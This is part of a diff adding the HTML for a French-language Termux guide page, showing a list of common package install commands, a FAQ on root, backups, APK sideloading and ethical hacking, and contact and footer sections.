+        <p><span class="cmd">$ proot-distro remove ubuntu</span> <span class="com"># Supprimer</span></p>
+        <p><span class="cmd">$ proot-distro backup ubuntu</span> <span class="com"># Sauvegarder</span></p>
+        <p><span class="cmd">$ pkg install cmatrix</span> <span class="com"># Effet Matrix</span></p>
+        <p><span class="cmd">$ pkg install cowsay</span> <span class="com"># Vache qui parle</span></p>
+        <p><span class="cmd">$ pkg install fortune</span> <span class="com"># Citations</span></p>
+        <p><span class="cmd">$ pkg install figlet</span> <span class="com"># Texte ASCII</span></p>
+        <p><span class="cmd">$ pkg install toilet</span> <span class="com"># Texte coloré</span></p>
+        <p><span class="cmd">$ pkg install ffmpeg</span> <span class="com"># Audio/Vidéo</span></p>
+        <p><span class="cmd">$ pkg install imagemagick</span> <span class="com"># Images</span></p>
+        <p><span class="cmd">$ pkg install tsu</span> <span class="com"># sudo pour Termux</span></p>
+        <p><span class="cmd">$ pkg install w3m</span> <span class="com"># Navigateur texte</span></p>
+        <p><span class="cmd">$ pkg install ranger</span> <span class="com"># Gestionnaire fichiers</span></p>
+        <p><span class="cmd">$ pkg install neofetch</span> <span class="com"># Infos système stylées</span></p>
+        <p><span class="cmd">$ pkg install zsh</span> <span class="com"># Meilleur shell</span></p>
+        <p><span class="cmd">$ pkg install tmux</span> <span class="com"># Multiplexeur terminal</span></p>
+        <p><span class="cmd">$ pkg install openssl</span> <span class="com"># Crypto</span></p>
+        <p><span class="cmd">$ pkg install gnupg</span> <span class="com"># Chiffrement</span></p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="container" id="faq">
+  <h2 class="section-title">❓ Questions Fréquentes</h2>
+
+  <div class="faq-item">
+    <div class="faq-q">Est-ce que Termux nécessite le root ?</div>
+    <div class="faq-a">Non ! Termux fonctionne parfaitement sans root. Tu peux installer des distros Linux complètes via proot-distro sans aucun problème.</div>
+  </div>
+
+  <div class="faq-item">
+    <div class="faq-q">Puis-je faire du hacking avec Termux ?</div>
+    <div class="faq-a">Oui ssi t'as des scripts personnalisé pu des connaissance avancée mais en vrai c'est un outil éducatif. Tu peux apprendre la cybersécurité sur TES PROPRES appareils/réseaux. Ne l'utilise jamais sur les appareils des autres sans autorisation écrite — c'est illégal.</div>
+  </div>
+
+  <div class="faq-item">
+    <div class="faq-q">Pourquoi "pkg update" échoue ?</div>
+    <div class="faq-a">Vérifie ta connexion internet. Si l'erreur persiste, va dans Paramètres → Applications → Termux → Stockage et autorise l'accès, puis relance.</div>
+  </div>
+
+  <div class="faq-item">
+    <div class="faq-q">Comment installer une APK sans Play Store ?</div>
+    <div class="faq-a">Télécharge l'APK depuis F-Droid, GitHub ou un site de confiance. Va dans Paramètres → Sécurité → Sources inconnues, autorise ton navigateur, puis installe.</div>
+  </div>
+
+  <div class="faq-item">
+    <div class="faq-q">Termux peut-il remplacer un PC ?</div>
+    <div class="faq-a">Pour beaucoup de tâches, oui ! Mais certaines limitations (pas de GPU, RAM limitée) font qu'il ne remplace pas totalement un PC pour le gaming ou le montage vidéo lourd.</div>
+  </div>
+
+  <div class="faq-item">
+    <div class="faq-q">Comment sauvegarder ma configuration ?</div>
+    <div class="faq-a">Utilise <code>tar -czvf backup.tar.gz ~/</code> pour tout sauvegarder. Ou <code>proot-distro backup</code> pour tes distros.</div>
+  </div>
+</section>
+
+<!-- CONTACT -->
+<section class="container" id="contact">
+  <h2 class="section-title">✉️ Contact</h2>
+  <div class="contact-box">
+    <p>Une question ? Un bug ? Une aide ? Contacte-nous !</p>
+
+    <div class="contact-links">
+      <a href="https://t.me/Sky_Plug" target="_blank" rel="noopener" class="contact-item telegram">
+        <span class="contact-icon">💬</span>
+        <span class="contact-label">Telegram</span>
+        <span class="contact-value">t.me/Sky_Plug</span>
+      </a>
+
+      <a href="mailto:skyprotector3@gmail.com" class="contact-item email">
+        <span class="contact-icon">📧</span>
+        <span class="contact-label">Email</span>
+        <span class="contact-value">skyprotector3@gmail.com</span>
+      </a>
+    </div>
+
+    <p class="credit-line">Développé par <span class="credit">Sky Plug SCM</span> × <span class="credit">The Terror SCM</span></p>
+  </div>
+</section>
+
+<footer>
+  <p>© 2026 <span class="sky">Sky</span>-<span class="term">Terminal</span> — Tous droits réservés</p>
+  <p class="small">Made in 509 by Sky Plug SCM & The Terror SCM🇵🇬🇵🇬🇵🇬🇵🇬 </p>
+</footer>
+
+<script src="script1.js"></script>
+</body>
+</html>
